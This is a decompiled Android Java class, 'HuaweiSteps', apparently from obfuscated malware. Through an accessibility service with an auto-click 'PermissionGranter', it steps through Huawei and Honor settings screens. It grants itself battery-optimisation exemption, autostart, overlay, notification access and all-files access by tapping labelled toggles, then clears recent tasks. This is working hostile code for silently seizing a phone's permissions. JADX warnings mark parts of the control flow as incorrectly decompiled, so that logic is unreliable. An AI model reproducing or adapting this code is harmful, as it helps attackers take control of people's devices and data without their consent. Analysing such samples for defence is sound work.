    /* JADX WARN: Removed duplicated region for block: B:100:0x01ff A[PHI: r2
      0x01ff: PHI (r2v30 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v28 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v31 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:98:0x01fc, B:13:0x0037] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:44:0x00f4 A[Catch: Exception -> 0x00f7, TryCatch #0 {Exception -> 0x00f7, blocks: (B:42:0x00ee, B:44:0x00f4, B:49:0x00fc, B:51:0x0100, B:52:0x010a), top: B:105:0x00ee }] */
    /* JADX WARN: Removed duplicated region for block: B:47:0x00f9  */
    /* JADX WARN: Removed duplicated region for block: B:58:0x012b A[PHI: r2
      0x012b: PHI (r2v4 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v2 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v5 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:56:0x0127, B:26:0x0092] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:61:0x0138 A[PHI: r2
      0x0138: PHI (r2v6 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v4 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v7 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:59:0x0134, B:25:0x008b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:64:0x014a A[PHI: r2
      0x014a: PHI (r2v8 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v6 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v9 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:62:0x0146, B:24:0x0084] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:67:0x0157 A[PHI: r2
      0x0157: PHI (r2v10 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v8 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v11 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:65:0x0153, B:23:0x007d] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:69:0x0160  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0166  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x0181 A[PHI: r2
      0x0181: PHI (r2v14 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v12 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v15 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:74:0x017d, B:21:0x006f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:79:0x0194 A[PHI: r2
      0x0194: PHI (r2v16 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v14 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v17 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:77:0x0190, B:20:0x0068] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x01a2 A[PHI: r2
      0x01a2: PHI (r2v18 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v16 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v19 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:80:0x019e, B:19:0x0061] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:85:0x01b4 A[PHI: r2
      0x01b4: PHI (r2v20 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v18 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v21 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:83:0x01b1, B:18:0x005a] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:88:0x01c1 A[PHI: r2
      0x01c1: PHI (r2v22 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v20 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v23 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:86:0x01be, B:17:0x0053] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:91:0x01d3 A[PHI: r2
      0x01d3: PHI (r2v24 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v22 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v25 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:89:0x01d0, B:16:0x004c] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:94:0x01e0 A[PHI: r2
      0x01e0: PHI (r2v26 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v24 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v27 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:92:0x01dd, B:15:0x0045] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:97:0x01f2 A[PHI: r2
      0x01f2: PHI (r2v28 com.storm.safe.rock.service.modules.yw5xud.a2) = (r2v26 com.storm.safe.rock.service.modules.yw5xud.a2), (r2v29 com.storm.safe.rock.service.modules.yw5xud.a2) binds: [B:95:0x01ef, B:14:0x003e] A[DONT_GENERATE, DONT_INLINE]] */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212162a9(ContinuationImpl continuationImpl) {
        HuaweiSteps$executeAll$1 huaweiSteps$executeAll$1;
        C0365a2 c0365a2;
        dqtvuisjd dqtvuisjdVar;
        C0260a2 c0260a2;
        if (continuationImpl instanceof HuaweiSteps$executeAll$1) {
            huaweiSteps$executeAll$1 = (HuaweiSteps$executeAll$1) continuationImpl;
            int i = huaweiSteps$executeAll$1.f53998a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeAll$1.f53998a3 = i - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeAll$1 = new HuaweiSteps$executeAll$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$executeAll$1.f53996a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (huaweiSteps$executeAll$1.f53998a3) {
            case 0:
                kg1.m213544f4(obj);
                if (Settings.System.canWrite(this.f55062a0)) {
                    t60.m214704c5("HuaweiSteps", "╔════════════════════════════════════════════════════════════");
                    tz0.m214809a9("║ ", this.f55065a3, "授权流程 - 已完成（检测到系统设置权限）", "HuaweiSteps");
                    t60.m214704c5("HuaweiSteps", "║ Settings.System.canWrite = true");
                    t60.m214704c5("HuaweiSteps", "║ 跳过整个适配流程");
                    t60.m214704c5("HuaweiSteps", "╚════════════════════════════════════════════════════════════");
                    return Boolean.TRUE;
                }
                t60.m214714d6("HuaweiSteps", "📍 [1/10] 基础权限");
                if (!this.f55064a2) {
                    huaweiSteps$executeAll$1.f53995a0 = this;
                    huaweiSteps$executeAll$1.f53998a3 = 2;
                    break;
                } else {
                    huaweiSteps$executeAll$1.f53995a0 = this;
                    huaweiSteps$executeAll$1.f53998a3 = 1;
                    break;
                }
                c0365a2.getClass();
                try {
                    AccessibilityService accessibilityService = c0365a2.f55063a1;
                    dqtvuisjdVar = !(accessibilityService instanceof dqtvuisjd) ? (dqtvuisjd) accessibilityService : null;
                    if (dqtvuisjdVar != null && (c0260a2 = dqtvuisjdVar.f52369a0) != null) {
                        c0260a2.m211329h2();
                        t60.m214714d6("dqtvuisjd", "✅ [授权] 已停止PermissionGranter自动点击功能");
                    }
                    t60.m214704c5("HuaweiSteps", "[权限] 已停止全局权限自动点击");
                } catch (Exception e) {
                    tz0.m214807a7("[权限] 停止全局权限自动点击失败: ", e.getMessage(), "HuaweiSteps");
                }
                t60.m214714d6("HuaweiSteps", "📍 [2/10] 电池优化白名单");
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 3;
                if (c0365a2.m212166b3(huaweiSteps$executeAll$1) != coroutineSingletons) {
                    huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                    huaweiSteps$executeAll$1.f53998a3 = 4;
                    if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                        t60.m214714d6("HuaweiSteps", "📍 [3/10] 电池设置");
                        huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                        huaweiSteps$executeAll$1.f53998a3 = 5;
                        if (c0365a2.m212165b2(huaweiSteps$executeAll$1) != coroutineSingletons) {
                            huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                            huaweiSteps$executeAll$1.f53998a3 = 6;
                            if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                                t60.m214714d6("HuaweiSteps", "📍 [4/10] 通知使用权");
                                if (c0365a2.f55064a2) {
                                    huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                    huaweiSteps$executeAll$1.f53998a3 = 7;
                                    if (c0365a2.m212170b7(huaweiSteps$executeAll$1) != coroutineSingletons) {
                                    }
                                } else {
                                    t60.m214704c5("HuaweiSteps", "[通知使用权] 荣耀设备跳过通知使用权");
                                }
                                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                huaweiSteps$executeAll$1.f53998a3 = 8;
                                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                                    t60.m214714d6("HuaweiSteps", "📍 [5/10] 自启动权限");
                                    huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                    huaweiSteps$executeAll$1.f53998a3 = 9;
                                    if (c0365a2.m212164b1(huaweiSteps$executeAll$1) != coroutineSingletons) {
                                        huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                        huaweiSteps$executeAll$1.f53998a3 = 10;
                                        if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                                            t60.m214714d6("HuaweiSteps", "📍 [6/10] 悬浮窗权限");
                                            huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                            huaweiSteps$executeAll$1.f53998a3 = 11;
                                            if (c0365a2.m212172b9(huaweiSteps$executeAll$1) != coroutineSingletons) {
                                                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                                huaweiSteps$executeAll$1.f53998a3 = 12;
                                                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                                                    t60.m214714d6("HuaweiSteps", "📍 [7/10] 通知权限");
                                                    huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                                    huaweiSteps$executeAll$1.f53998a3 = 13;
                                                    if (c0365a2.m212171b8(huaweiSteps$executeAll$1) != coroutineSingletons) {
                                                        huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                                        huaweiSteps$executeAll$1.f53998a3 = 14;
                                                        if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                                                            t60.m214714d6("HuaweiSteps", "📍 [8/10] 所有文件访问权限");
                                                            huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                                            huaweiSteps$executeAll$1.f53998a3 = 15;
                                                            if (c0365a2.m212163b0(huaweiSteps$executeAll$1) != coroutineSingletons) {
                                                                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                                                                huaweiSteps$executeAll$1.f53998a3 = 16;
                                                                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                                                                    t60.m214714d6("HuaweiSteps", "📍 [9/10] 清除最近任务");
                                                                    huaweiSteps$executeAll$1.f53995a0 = null;
                                                                    huaweiSteps$executeAll$1.f53998a3 = 17;
                                                                    break;
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
            case 2:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                c0365a2.getClass();
                AccessibilityService accessibilityService2 = c0365a2.f55063a1;
                if (!(accessibilityService2 instanceof dqtvuisjd)) {
                }
                if (dqtvuisjdVar != null) {
                    c0260a2.m211329h2();
                    t60.m214714d6("dqtvuisjd", "✅ [授权] 已停止PermissionGranter自动点击功能");
                    break;
                }
                t60.m214704c5("HuaweiSteps", "[权限] 已停止全局权限自动点击");
                t60.m214714d6("HuaweiSteps", "📍 [2/10] 电池优化白名单");
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 3;
                if (c0365a2.m212166b3(huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 4;
                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                t60.m214714d6("HuaweiSteps", "📍 [3/10] 电池设置");
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 5;
                if (c0365a2.m212165b2(huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 6;
                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                t60.m214714d6("HuaweiSteps", "📍 [4/10] 通知使用权");
                if (c0365a2.f55064a2) {
                }
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 8;
                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 8;
                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                t60.m214714d6("HuaweiSteps", "📍 [5/10] 自启动权限");
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 9;
                if (c0365a2.m212164b1(huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 9:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 10;
                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 10:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                t60.m214714d6("HuaweiSteps", "📍 [6/10] 悬浮窗权限");
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 11;
                if (c0365a2.m212172b9(huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case oe0.DEFAULT_M /* 11 */:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 12;
                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                t60.m214714d6("HuaweiSteps", "📍 [7/10] 通知权限");
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 13;
                if (c0365a2.m212171b8(huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 14;
                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                t60.m214714d6("HuaweiSteps", "📍 [8/10] 所有文件访问权限");
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 15;
                if (c0365a2.m212163b0(huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                huaweiSteps$executeAll$1.f53995a0 = c0365a2;
                huaweiSteps$executeAll$1.f53998a3 = 16;
                if (b81.m210571b1(100L, huaweiSteps$executeAll$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 16:
                c0365a2 = huaweiSteps$executeAll$1.f53995a0;
                kg1.m213544f4(obj);
                t60.m214714d6("HuaweiSteps", "📍 [9/10] 清除最近任务");
                huaweiSteps$executeAll$1.f53995a0 = null;
                huaweiSteps$executeAll$1.f53998a3 = 17;
                break;
            case 17:
                kg1.m213544f4(obj);
                t60.m214704c5("HuaweiSteps", "╔════════════════════════════════════════════════════════════");
                t60.m214704c5("HuaweiSteps", "║ 华为授权完成");
                t60.m214704c5("HuaweiSteps", "╚════════════════════════════════════════════════════════════");
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(7:53|54|55|144|56|(3:147|59|(4:61|62|134|(3:135|136|137)(0))(9:65|(3:68|(3:155|70|(1:72)(8:73|74|(6:79|(1:81)(2:83|(1:85)(1:86))|82|87|88|(2:90|(1:92)(2:93|(1:95)(5:96|(2:98|(1:100)(2:101|102))|103|88|(0)))))|104|105|140|106|(1:108)(8:109|110|(2:112|(1:114)(3:118|119|120))|115|126|(1:128)(1:129)|136|137)))(1:75)|66)|154|(7:77|79|(0)(0)|82|87|88|(0))|104|105|140|106|(0)(0)))|122) */
    /* JADX WARN: Can't wrap try/catch for region: R(9:65|(3:68|(3:155|70|(1:72)(8:73|74|(6:79|(1:81)(2:83|(1:85)(1:86))|82|87|88|(2:90|(1:92)(2:93|(1:95)(5:96|(2:98|(1:100)(2:101|102))|103|88|(0)))))|104|105|140|106|(1:108)(8:109|110|(2:112|(1:114)(3:118|119|120))|115|126|(1:128)(1:129)|136|137)))(1:75)|66)|154|(7:77|79|(0)(0)|82|87|88|(0))|104|105|140|106|(0)(0)) */
    /* JADX WARN: Code restructure failed: missing block: B:116:0x02bd, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:121:0x02d2, code lost:
    
        if (p000.b81.m210571b1(300, r3) == r4) goto L122;
     */
    /* JADX WARN: Code restructure failed: missing block: B:131:0x02ec, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Code restructure failed: missing block: B:152:0x0225, code lost:
    
        r2 = r2 + 1;
     */
    /* JADX WARN: Path cross not found for [B:104:0x029d, B:90:0x0229], limit reached: 153 */
    /* JADX WARN: Path cross not found for [B:90:0x0229, B:104:0x029d], limit reached: 153 */
    /* JADX WARN: Removed duplicated region for block: B:108:0x02ac  */
    /* JADX WARN: Removed duplicated region for block: B:109:0x02ad  */
    /* JADX WARN: Removed duplicated region for block: B:112:0x02b1 A[Catch: Exception -> 0x02bd, TryCatch #1 {Exception -> 0x02bd, blocks: (B:112:0x02b1, B:114:0x02b7, B:118:0x02c1, B:106:0x02a6), top: B:140:0x02a6 }] */
    /* JADX WARN: Removed duplicated region for block: B:128:0x02e0 A[Catch: Exception -> 0x02d8, TryCatch #4 {Exception -> 0x02d8, blocks: (B:123:0x02d5, B:120:0x02ce, B:126:0x02da, B:128:0x02e0, B:129:0x02e6), top: B:146:0x02d5 }] */
    /* JADX WARN: Removed duplicated region for block: B:129:0x02e6 A[Catch: Exception -> 0x02d8, TRY_LEAVE, TryCatch #4 {Exception -> 0x02d8, blocks: (B:123:0x02d5, B:120:0x02ce, B:126:0x02da, B:128:0x02e0, B:129:0x02e6), top: B:146:0x02d5 }] */
    /* JADX WARN: Removed duplicated region for block: B:135:0x0302  */
    /* JADX WARN: Removed duplicated region for block: B:53:0x00e4  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x013a A[Catch: Exception -> 0x0147, TryCatch #5 {Exception -> 0x0147, blocks: (B:59:0x012f, B:61:0x013a, B:65:0x014a, B:68:0x0160, B:70:0x0169, B:75:0x0199, B:77:0x019e, B:79:0x01a4, B:81:0x01ac, B:82:0x01be, B:87:0x01ef, B:90:0x0229, B:92:0x022f, B:93:0x0234, B:96:0x0273, B:98:0x0277, B:103:0x0298, B:83:0x01c1, B:85:0x01c9, B:86:0x01dc, B:104:0x029d), top: B:147:0x012f }] */
    /* JADX WARN: Removed duplicated region for block: B:65:0x014a A[Catch: Exception -> 0x0147, TryCatch #5 {Exception -> 0x0147, blocks: (B:59:0x012f, B:61:0x013a, B:65:0x014a, B:68:0x0160, B:70:0x0169, B:75:0x0199, B:77:0x019e, B:79:0x01a4, B:81:0x01ac, B:82:0x01be, B:87:0x01ef, B:90:0x0229, B:92:0x022f, B:93:0x0234, B:96:0x0273, B:98:0x0277, B:103:0x0298, B:83:0x01c1, B:85:0x01c9, B:86:0x01dc, B:104:0x029d), top: B:147:0x012f }] */
    /* JADX WARN: Removed duplicated region for block: B:77:0x019e A[Catch: Exception -> 0x0147, TryCatch #5 {Exception -> 0x0147, blocks: (B:59:0x012f, B:61:0x013a, B:65:0x014a, B:68:0x0160, B:70:0x0169, B:75:0x0199, B:77:0x019e, B:79:0x01a4, B:81:0x01ac, B:82:0x01be, B:87:0x01ef, B:90:0x0229, B:92:0x022f, B:93:0x0234, B:96:0x0273, B:98:0x0277, B:103:0x0298, B:83:0x01c1, B:85:0x01c9, B:86:0x01dc, B:104:0x029d), top: B:147:0x012f }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Removed duplicated region for block: B:81:0x01ac A[Catch: Exception -> 0x0147, TryCatch #5 {Exception -> 0x0147, blocks: (B:59:0x012f, B:61:0x013a, B:65:0x014a, B:68:0x0160, B:70:0x0169, B:75:0x0199, B:77:0x019e, B:79:0x01a4, B:81:0x01ac, B:82:0x01be, B:87:0x01ef, B:90:0x0229, B:92:0x022f, B:93:0x0234, B:96:0x0273, B:98:0x0277, B:103:0x0298, B:83:0x01c1, B:85:0x01c9, B:86:0x01dc, B:104:0x029d), top: B:147:0x012f }] */
    /* JADX WARN: Removed duplicated region for block: B:83:0x01c1 A[Catch: Exception -> 0x0147, TryCatch #5 {Exception -> 0x0147, blocks: (B:59:0x012f, B:61:0x013a, B:65:0x014a, B:68:0x0160, B:70:0x0169, B:75:0x0199, B:77:0x019e, B:79:0x01a4, B:81:0x01ac, B:82:0x01be, B:87:0x01ef, B:90:0x0229, B:92:0x022f, B:93:0x0234, B:96:0x0273, B:98:0x0277, B:103:0x0298, B:83:0x01c1, B:85:0x01c9, B:86:0x01dc, B:104:0x029d), top: B:147:0x012f }] */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0229 A[Catch: Exception -> 0x0147, TryCatch #5 {Exception -> 0x0147, blocks: (B:59:0x012f, B:61:0x013a, B:65:0x014a, B:68:0x0160, B:70:0x0169, B:75:0x0199, B:77:0x019e, B:79:0x01a4, B:81:0x01ac, B:82:0x01be, B:87:0x01ef, B:90:0x0229, B:92:0x022f, B:93:0x0234, B:96:0x0273, B:98:0x0277, B:103:0x0298, B:83:0x01c1, B:85:0x01c9, B:86:0x01dc, B:104:0x029d), top: B:147:0x012f }] */
    /* JADX WARN: Removed duplicated region for block: B:98:0x0277 A[Catch: Exception -> 0x0147, TryCatch #5 {Exception -> 0x0147, blocks: (B:59:0x012f, B:61:0x013a, B:65:0x014a, B:68:0x0160, B:70:0x0169, B:75:0x0199, B:77:0x019e, B:79:0x01a4, B:81:0x01ac, B:82:0x01be, B:87:0x01ef, B:90:0x0229, B:92:0x022f, B:93:0x0234, B:96:0x0273, B:98:0x0277, B:103:0x0298, B:83:0x01c1, B:85:0x01c9, B:86:0x01dc, B:104:0x029d), top: B:147:0x012f }] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:121:0x02d2 -> B:15:0x0049). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:140:0x02a6 -> B:116:0x02bd). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x013a -> B:62:0x0143). Please report as a decompilation issue!!! */
    /* renamed from: b0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212163b0(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeAllFilesAccess$1 huaweiSteps$executeAllFilesAccess$1;
        C1351vv c1351vv;
        C0365a2 c0365a2;
        int i;
        int i2;
        int i3;
        int i4;
        C0365a2 c0365a22;
        int i5;
        int i6;
        int i7;
        int iM212181d5;
        int i8;
        float fM212180d4;
        float f;
        int i9;
        C1351vv c1351vv2 = C1351vv.f60710b1;
        if (continuationImpl instanceof HuaweiSteps$executeAllFilesAccess$1) {
            huaweiSteps$executeAllFilesAccess$1 = (HuaweiSteps$executeAllFilesAccess$1) continuationImpl;
            int i10 = huaweiSteps$executeAllFilesAccess$1.f54006a7;
            if ((i10 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeAllFilesAccess$1.f54006a7 = i10 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeAllFilesAccess$1 = new HuaweiSteps$executeAllFilesAccess$1(this, continuationImpl);
            }
        }
        Object obj = huaweiSteps$executeAllFilesAccess$1.f54004a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i11 = 3;
        try {
        } catch (Exception e) {
            e = e;
            c1351vv = c1351vv2;
        }
        switch (huaweiSteps$executeAllFilesAccess$1.f54006a7) {
            case 0:
                kg1.m213544f4(obj);
                t60.m214704c5("HuaweiSteps", "[所有文件] 开始");
                String str = this.f55075b3;
                if (m212193f0(str)) {
                    t60.m214704c5("HuaweiSteps", "[所有文件] 已标记完成，跳过");
                    return c1351vv2;
                }
                if (Build.VERSION.SDK_INT < 30) {
                    t60.m214704c5("HuaweiSteps", "[所有文件] Android 10及以下不需要此权限");
                    m212195f2(str);
                    return c1351vv2;
                }
                if (Environment.isExternalStorageManager()) {
                    t60.m214704c5("HuaweiSteps", "[所有文件] 已有所有文件访问权限");
                    m212195f2(str);
                    return c1351vv2;
                }
                c0365a2 = this;
                i = 1;
                if (i >= i11) {
                    AbstractC0003a2.m44c5("[所有文件] 第", i, "次尝试", "HuaweiSteps");
                    t60.m214704c5("HuaweiSteps", "[所有文件] 步骤1: 打开设置页面");
                    Intent intent = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
                    intent.setData(Uri.parse("package:" + c0365a2.f55062a0.getPackageName()));
                    intent.setFlags(276824064);
                    c0365a2.f55063a1.startActivity(intent);
                    huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                    huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                    huaweiSteps$executeAllFilesAccess$1.f54006a7 = 1;
                    c1351vv = c1351vv2;
                    if (b81.m210571b1(300L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                        try {
                        } catch (Exception e2) {
                            e = e2;
                            tz0.m214807a7("[所有文件] 异常: ", e.getMessage(), "HuaweiSteps");
                            i++;
                            c1351vv2 = c1351vv;
                            i11 = 3;
                            if (i >= i11) {
                            }
                        }
                        t60.m214704c5("HuaweiSteps", "[所有文件] 步骤2: 页面验证");
                        if (c0365a2.m212188e2()) {
                            t60.m214704c5("HuaweiSteps", "[所有文件] 未进入正确页面，重新开始");
                            i++;
                            c1351vv2 = c1351vv;
                            i11 = 3;
                            if (i >= i11) {
                                c1351vv = c1351vv2;
                                c0365a2.m212195f2(c0365a2.f55075b3);
                                t60.m214704c5("HuaweiSteps", "[所有文件] 完成");
                                return c1351vv;
                            }
                        } else {
                            t60.m214704c5("HuaweiSteps", "[所有文件] 步骤3: 开启权限");
                            String[] strArr = {"允许管理所有文件", "允许访问所有文件", "所有文件访问权限", "允许"};
                            i8 = 0;
                            for (int i12 = 0; i12 < 4; i12++) {
                                String str2 = strArr[i12];
                                if (c0365a2.m212208g6(str2, true)) {
                                    t60.m214704c5("HuaweiSteps", "[所有文件] 通过文本'" + str2 + "'开启");
                                    huaweiSteps$executeAllFilesAccess$1.f53999a0 = c0365a2;
                                    huaweiSteps$executeAllFilesAccess$1.f54000a1 = i;
                                    huaweiSteps$executeAllFilesAccess$1.f54001a2 = 1;
                                    huaweiSteps$executeAllFilesAccess$1.f54006a7 = 2;
                                    if (b81.m210571b1(100L, huaweiSteps$executeAllFilesAccess$1) != coroutineSingletons) {
                                        i9 = 1;
                                        i8 = i9;
                                        if (i8 == 0 && !Environment.isExternalStorageManager()) {
